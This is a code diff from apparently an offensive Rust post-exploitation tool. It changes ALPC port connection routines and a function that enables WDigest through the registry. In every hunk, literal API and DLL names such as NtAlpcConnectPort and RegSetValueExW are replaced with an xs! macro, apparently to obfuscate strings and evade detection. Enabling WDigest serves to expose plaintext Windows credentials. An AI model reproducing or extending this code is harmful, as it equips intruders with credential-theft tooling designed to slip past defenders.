@@ -264,7 +264,10 @@ mod alpc {
         /// Connect to an ALPC port by name
         pub fn connect(port_name: &str) -> Result<Self> {
             unsafe {
-                let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).map_err(|e| {
+                let ntdll = GetModuleHandleA(windows::core::PCSTR(
+                    crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+                ))
+                .map_err(|e| {
                     OverthroneError::PostExploitation(format!("Failed to get ntdll handle: {e}"))
                 })?;
 
@@ -280,13 +283,15 @@ mod alpc {
                     *mut std::ffi::c_void,
                     *mut std::ffi::c_void,
                 ) -> i32 = mem::transmute(
-                    GetProcAddress(ntdll, windows::core::s!("NtAlpcConnectPort")).ok_or_else(
-                        || {
-                            OverthroneError::PostExploitation(
-                                "NtAlpcConnectPort not found in ntdll.dll".to_string(),
-                            )
-                        },
-                    )?,
+                    GetProcAddress(
+                        ntdll,
+                        windows::core::PCSTR(crate::xs!("NtAlpcConnectPort").as_bytes().as_ptr()),
+                    )
+                    .ok_or_else(|| {
+                        OverthroneError::PostExploitation(
+                            "NtAlpcConnectPort not found in ntdll.dll".to_string(),
+                        )
+                    })?,
                 );
 
                 let mut port_handle: HANDLE = HANDLE(std::ptr::null_mut());
@@ -331,18 +336,26 @@ mod alpc {
                     *mut u32,
                     *mut std::ffi::c_void,
                 ) -> i32 = {
-                    let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).map_err(|e| {
+                    let ntdll = GetModuleHandleA(windows::core::PCSTR(
+                        crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+                    ))
+                    .map_err(|e| {
                         OverthroneError::PostExploitation(format!(
                             "Failed to get ntdll handle: {e}"
                         ))
                     })?;
                     mem::transmute(
-                        GetProcAddress(ntdll, windows::core::s!("NtAlpcSendWaitReceivePort"))
-                            .ok_or_else(|| {
-                                OverthroneError::PostExploitation(
-                                    "NtAlpcSendWaitReceivePort not found".to_string(),
-                                )
-                            })?,
+                        GetProcAddress(
+                            ntdll,
+                            windows::core::PCSTR(
+                                crate::xs!("NtAlpcSendWaitReceivePort").as_bytes().as_ptr(),
+                            ),
+                        )
+                        .ok_or_else(|| {
+                            OverthroneError::PostExploitation(
+                                "NtAlpcSendWaitReceivePort not found".to_string(),
+                            )
+                        })?,
                     )
                 };
 
@@ -373,9 +386,16 @@ mod alpc {
         fn drop(&mut self) {
             if self.connected {
                 unsafe {
-                    if let Some(module) = GetModuleHandleA(windows::core::s!("ntdll.dll")).ok()
-                        && let Some(proc) =
-                            GetProcAddress(module, windows::core::s!("NtAlpcDisconnectPort"))
+                    if let Some(module) = GetModuleHandleA(windows::core::PCSTR(
+                        crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+                    ))
+                    .ok()
+                        && let Some(proc) = GetProcAddress(
+                            module,
+                            windows::core::PCSTR(
+                                crate::xs!("NtAlpcDisconnectPort").as_bytes().as_ptr(),
+                            ),
+                        )
                     {
                         let disconnect_fn: extern "system" fn(HANDLE) -> i32 = mem::transmute(proc);
                         disconnect_fn(self.handle);
@@ -898,9 +918,9 @@ unsafe fn enable_wdigest_local(
     _numbers: &crate::postex::syscall::SyscallNumbers,
 ) -> Result<String> {
     unsafe {
-        let advapi32 = windows::Win32::System::LibraryLoader::GetModuleHandleA(windows::core::s!(
-            "advapi32.dll"
-        ))
+        let advapi32 = windows::Win32::System::LibraryLoader::GetModuleHandleA(
+            windows::core::PCSTR(crate::xs!("advapi32.dll").as_bytes().as_ptr()),
+        )
         .map_err(|e| {
             OverthroneError::PostExploitation(format!("Failed to get advapi32 handle: {e}"))
         })?;
@@ -918,7 +938,7 @@ unsafe fn enable_wdigest_local(
         ) -> u32 = std::mem::transmute(
             windows::Win32::System::LibraryLoader::GetProcAddress(
                 advapi32,
-                windows::core::s!("RegCreateKeyExW"),
+                windows::core::PCSTR(crate::xs!("RegCreateKeyExW").as_bytes().as_ptr()),
             )
             .ok_or_else(|| {
                 OverthroneError::PostExploitation(
@@ -937,7 +957,7 @@ unsafe fn enable_wdigest_local(
         ) -> u32 = std::mem::transmute(
             windows::Win32::System::LibraryLoader::GetProcAddress(
                 advapi32,
-                windows::core::s!("RegSetValueExW"),
+                windows::core::PCSTR(crate::xs!("RegSetValueExW").as_bytes().as_ptr()),
             )
             .ok_or_else(|| {
                 OverthroneError::PostExploitation(
@@ -949,7 +969,7 @@ unsafe fn enable_wdigest_local(
         let reg_close_key: extern "system" fn(isize) -> u32 = std::mem::transmute(
             windows::Win32::System::LibraryLoader::GetProcAddress(
                 advapi32,
-                windows::core::s!("RegCloseKey"),
+                windows::core::PCSTR(crate::xs!("RegCloseKey").as_bytes().as_ptr()),
             )
             .ok_or_else(|| {
                 OverthroneError::PostExploitation(
